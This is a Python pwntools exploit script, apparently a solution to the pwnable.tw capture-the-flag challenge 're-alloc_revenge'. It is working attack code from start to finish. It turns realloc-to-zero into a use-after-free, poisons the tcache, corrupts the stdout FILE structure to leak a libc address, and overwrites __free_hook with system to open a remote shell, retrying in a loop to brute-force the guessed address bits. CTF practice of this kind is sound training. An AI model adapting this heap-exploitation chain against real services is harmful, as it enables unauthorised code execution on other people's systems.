from pwn import *

locdbg=False
host='chall.pwnable.tw'
port=10310
filename='./re-alloc_revenge'
libcname='./libc.so.6'
elf=ELF(filename)
slpt=0
context.terminal=['tmux','split-window','-h']

if locdbg:
    libc=ELF('../../glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc.so.6')
    context.log_level='debug'
    oneg=0x106ef8
else:
    libc=ELF(libcname)
    context.log_level='debug'
    oneg=0x1063f8

p=None

def pwndbg(ctt):
    if locdbg:
        gdb.attach(p,gdbscript=ctt)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def alc(idx,sz,dat):
    p.recvuntil(b'choice: ')
    p.sendline(b'1')
    slp()
    p.recvuntil(b'Index:')
    p.send(str(idx).encode())
    slp()
    p.recvuntil(b'Size:')
    p.send(str(sz).encode())
    slp()
    p.recvuntil(b'Data:')
    p.send(dat)
    slp()

def realc(idx,sz,dat):
    p.recvuntil(b'choice: ')
    p.sendline(b'2')
    slp()
    p.recvuntil(b'Index:')
    p.send(str(idx).encode())
    slp()
    p.recvuntil(b'Size:')
    p.send(str(sz).encode())
    slp()
    if(sz):
        p.recvuntil(b'Data:')
        p.send(dat)
        slp()
    else:
        p.recvuntil(b'alloc error\n')

def fr(idx):
    p.recvuntil(b'choice: ')
    p.sendline(b'3')
    slp()
    p.recvuntil(b'Index:')
    p.send(str(idx).encode())
    slp()

def trick(pid):
    s=open('/proc/'+str(pid)+'/maps').read().split('\n')[8].split('-')[0]
    #print(s)
    libc_base=int(s,16)
    stdo=libc_base+libc.symbols['_IO_2_1_stdout_']
    return (stdo//256)%256

def trick_base(pid):
    s=open('/proc/'+str(pid)+'/maps').read().split('\n')[8].split('-')[0]
    libc_base=int(s,16)
    return libc_base

def exp():
    global p
    if(locdbg):
        p=process(filename)
        print('pid='+str(p.pid))

    else:
        p=remote(host,port)
    alc(0,0x78,p64(0)*3+p64(0xa1))
    alc(1,0x78,p64(0)*3+p64(0x61)+p64(0)*3+p64(0x41))
    fr(1)
    realc(0,0,b'')
    realc(0,0x78,p64(0)*2)
    realc(0,0,b'')

    realc(0,0x78,b'\x80')
    alc(1,0x78,b'test')
    realc(1,0x58,b'test')
    fr(1)
    alc(1,0x78,b'test')
    for i in range(7):
        realc(1,0,b'')
        realc(1,0x18,p64(0)*2)
        realc(0,0x58,p64(0)*3+p64(0xa1)+p64(0)*3+p64(0x81)+p64(0)*2)
        #pwndbg('')
    realc(0,0x58,p64(0)*3+p64(0x81)+p64(0)*3+p64(0x81)+p64(0)*2)
    #pwndbg('')
    realc(1,0,b'')
    realc(0,0x58,p64(0)*3+p64(0xa1)+p64(0)*3+p64(0x81)+p64(0)*2)
    realc(1,0,b'')
    realc(0,0x58,p64(0)*3+p64(0x81))#+p64(0)*3+p64(0x81)+p64(0)*2)
    fr(0)
    '''
    if(locdbg):
        pl=b'\x40'+p8(trick(p.pid))
        print('trick')
        print(pl)
        realc(1,0x78,pl)
    else:
        realc(1,0x78,b'\x40\x37')'''
    realc(1,0x78,b'\x40\x37')
    alc(0,0x78,b'23333')
    #pwndbg('')
    realc(0,0x38,p64(0)*2)
    fr(0)
    alc(0,0x78,p64(0)*14)
    #pwndbg('')
    realc(0,0x78,b'23333')
    #python3 exp.py
    fr(0)
    alc(0,0x78,b'/bin/sh\0'*2+p64(0xfbad1800)+p64(0)*3+b'\xc8')
    #realc(0,0)
    print('finish')
    s=p.recvuntil(b'$$$')[8:16]
    ANSIstr=0x1b3578
    libc_leak=u64(s)
    log.success('libc_leak='+hex(libc_leak))
    libc_base=libc_leak-0x1b3578
    '''
    if(locdbg):
        libc_base=trick_base(p.pid)'''
    print("libc_base="+hex(libc_base))
    fr_hk=libc.symbols['__free_hook']+libc_base
    realc_hk=libc.symbols['__realloc_hook']+libc_base
    system_addr=libc.symbols['system']+libc_base
    onegad=oneg+libc_base
    realc(1,0x78,p64(0)*2+p64(0)+p64(0x41)+p64(fr_hk)+p64(0)*5+p64(0)+p64(0x41))
    fr(1)
    alc(1,0x38,b'test')
    realc(1,0x18,b'test')
    fr(1)
    alc(1,0x38,p64(system_addr)+p64(0)*2+p64(0x21)+b'/bin/sh\0')
    #realc(1,0x18,'finish')
    fr(0)
    #pwndbg('')
    fin()

while(1):
    try:
        exp()
    except:
        p.close()
        continue

#strings --radix=x libc.so.6 | grep ANSI